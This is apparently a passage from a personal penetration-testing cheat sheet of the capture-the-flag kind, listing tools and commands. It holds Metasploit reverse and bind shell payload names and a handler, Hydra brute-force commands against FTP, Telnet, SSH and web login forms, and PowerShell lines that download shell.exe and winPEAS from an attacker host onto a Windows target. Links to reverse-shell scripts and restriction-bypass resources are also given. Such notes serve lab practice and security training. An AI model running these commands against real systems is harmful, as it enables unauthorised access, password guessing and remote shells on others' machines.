linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
```
- Staged (x86 in the list)
```
linux/x86/shell/bind_tcp
linux/x86/shell/reverse_tcp
windows/shell/bind_tcp
windows/shell/reverce_tcp
```
- Stageless (x86 in the list) (The most compact payloads)
```
linux/x86/shell_reverse_tcp
linux/x86/shell_bind_tcp
windows/shell_bind_tcp
windows/shell_reverse_tcp
```
Multi Handler
```
use exploit/multi/handler
```

## Gobuster
https://github.com/OJ/gobuster
```
gobuster dir -u [http://<ip>:<port> or domain] -w <word list location>
```
/robots.txt
recomendet list https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt

## Hidra
FTP:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.13.37 ftp -o ftp-result.txt
```
TELNET:
```
hydra -L /usr/share/wordlists/common-usernames -P /usr/share/wordlists/rockyou.txt 192.168.13.37 telnet
```
SSH:
```
hydra -l <username> -P <full path to pass> 10.10.85.12 -t 4 ssh
```
Web Post Form:  
http-post-form - Note: You’ll need to enter https if you’re attacking a site on port 443.  
```
sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"

hydra -l <username> -P <wordlist> 10.10.85.12 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

hydra -l admin -P /usr/share/wordlists/rockyou.txt   10.10.118.158 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=0%2FMGgWbIzIRgqhDCtNxWFt4Tc9qyY5a9TZRKNvqhCwYMrXGMAYBZml7vdDtpwP0Gs8B%2BJALyjKTCEIMk6xYFrbTt622CVKylB7FK8oaJLlg%2B%2FOWgr9%2BL3PHbrUzQH8wLnV%2FN%2Bj3Rye5w9YS36Ier%2BWkL27YST5VvFpvoG1xcn5uuHXo85zrG7bjPB9L9QpmoOkalVM7PN3AlHN9ZF%2BQo6UuS8pNePHcNagYeWoQ47VqMO1yj8gKtcIj6mX0cXJ1U2FqAyInk%2BcMtIRceh69zAUdKnyp85tlaS9%2FFcmUXlN1922ZFAaCintSprVFHb6IXZOVLnvuTMhaCWBm6HtcIju7Vk4p1DHvB9pXEWZf5%2FawRBnRc&__EVENTVALIDATION=YRuRYPS0n%2FeTLUd5sdh31ZXHxhW6Xh%2BepJW9H2xkRVVZOZfo9IpP6Rui2nn%2ByuZpCCnOkSEhE%2Fd8%2FwZ4EZ6N7lOobh%2FU8pDcxVHXTdgKuELMtvwy6BGJkNTqV8dIK47bernMdrk22BfWb0DA1a%2Brp5NvMYgH8AG8NI2JL6x7YfE0Oj0o&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -vv
```

## Windows 
- Dump the metarpreter hear
  - C:\Windows\Temp
```
powershell -c "Invoke-WebRequest -Uri 'http://10.10.192.186:8080/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"

shell
powershell -c "Invoke-WebRequest -Uri 'http://10.10.192.186:8080/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"
exit
```

- https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- https://github.com/samratashok/nishang
  - https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1


## Unix Binaries (Used to bypass security restrictions)
https://gtfobins.github.io/

## Identify technologies on websites 
https://www.wappalyzer.com/apps

## Free Password Hash Cracker  
https://crackstation.net/    

## Hash identifier
https://gitlab.com/kalilinux/packages/hash-identifier/  

## File Shering Services
https://siasky.net/  

## HackTricks hacking trick/technique/whatever
https://book.hacktricks.xyz/

## Serving Files From Your Host
```
python3 -m  http.server 8080
```
UpDog a more advance webserver: 
https://github.com/sc0tfree/updog  

If we know ssh  
```
scp [File] [User]@[IP]:/dev/shm
```

## Nmap
```
nmap -sC -sV -oN initialScan [IP]/24
```

## Enum4linux
Enum4linux is a tool for enumerating information from Windows and Samba systems
```
 enum4linux -a [IP]
```

## Windows deep clean 
https://old.reddit.com/r/TronScript/  
- Download Tron. The download links are in the top post in /r/TronScript. If you download the self-extracting .exe file, run it and it will extract tron.bat and the \resources folder to the current directory. Copy both of them to the Desktop of the target machine.

- Tron can be run with Windows in either Safe Mode or Regular mode. Regular mode is generally recommended unless the system is severly infected.

- Right-click tron.bat and select "Run as Administrator"

## MacOS Security
https://objective-see.com/

## Shodan.io
Search for vulnerable devices (can check your own ip)  
https://www.shodan.io/
